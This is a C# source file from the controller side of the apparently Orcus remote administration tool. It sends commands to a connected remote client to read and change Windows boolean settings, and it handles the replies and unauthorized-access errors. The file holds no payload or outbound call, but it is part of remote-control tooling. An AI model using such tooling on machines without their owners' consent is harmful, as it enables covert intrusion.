using System;
using System.Text;
using System.Windows;
using Orcus.Administration.Plugins;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Shared.Commands.WindowsCustomizer;
using Orcus.Shared.NetSerializer;

namespace Orcus.Administration.Commands.WindowsCustomizer
{
    [DescribeCommandByEnum(typeof (WindowsCustomizerCommunication))]
    public class WindowsCustomizerCommand : Command
    {
        public event EventHandler<CurrentSettings> CurrentSettingsReceived;
        public event EventHandler<BooleanPropertyChangedEventArgs> BooleanPropertyChanged;
        public event EventHandler<BooleanPropertyChangedEventArgs> BooleanPropertyChangedError;

        public override void ResponseReceived(byte[] parameter)
        {
            switch ((WindowsCustomizerCommunication) parameter[0])
            {
                case WindowsCustomizerCommunication.ResponseCurrentSettings:
                    CurrentSettingsReceived?.Invoke(this,
                        new Serializer(typeof (CurrentSettings)).Deserialize<CurrentSettings>(parameter, 1));
                    LogService.Receive((string) Application.Current.Resources["CurrentPropertiesReceived"]);
                    break;
                case WindowsCustomizerCommunication.BooleanValueChanged:
                    BooleanPropertyChanged?.Invoke(this,
                        new BooleanPropertyChangedEventArgs(
                            Encoding.UTF8.GetString(parameter, 2, parameter.Length - 2), parameter[1] == 1));
                    LogService.Receive((string) Application.Current.Resources["PropertyWasChanged"]);
                    break;
                case WindowsCustomizerCommunication.UnauthorizedAccessException:
                    LogService.Error((string) Application.Current.Resources["UnauthorizedAccess"]);
                    BooleanPropertyChangedError?.Invoke(this,
                        new BooleanPropertyChangedEventArgs(
                            Encoding.UTF8.GetString(parameter, 2, parameter.Length - 2), parameter[1] == 1));
                    break;
                default:
                    throw new ArgumentOutOfRangeException();
            }
        }

        public void GetCurrentSettings()
        {
            ConnectionInfo.SendCommand(this, new[] {(byte) WindowsCustomizerCommunication.GetCurrentSettings});
            LogService.Send((string) Application.Current.Resources["GetCurrentProperties"]);
        }

        public void ChangeBooleanProperty(string name, bool newValue)
        {
            var nameData = Encoding.UTF8.GetBytes(name);
            var data = new byte[nameData.Length + 2];
            data[0] = (byte) WindowsCustomizerCommunication.ChangeBooleanValue;
            data[1] = (byte) (newValue ? 1 : 0);
            Array.Copy(nameData, 0, data, 2, nameData.Length);
            ConnectionInfo.SendCommand(this, data);
            LogService.Send(string.Format((string) Application.Current.Resources["ChangeValue"], name, newValue));
        }

        protected override uint GetId()
        {
            return 27;
        }
    }
}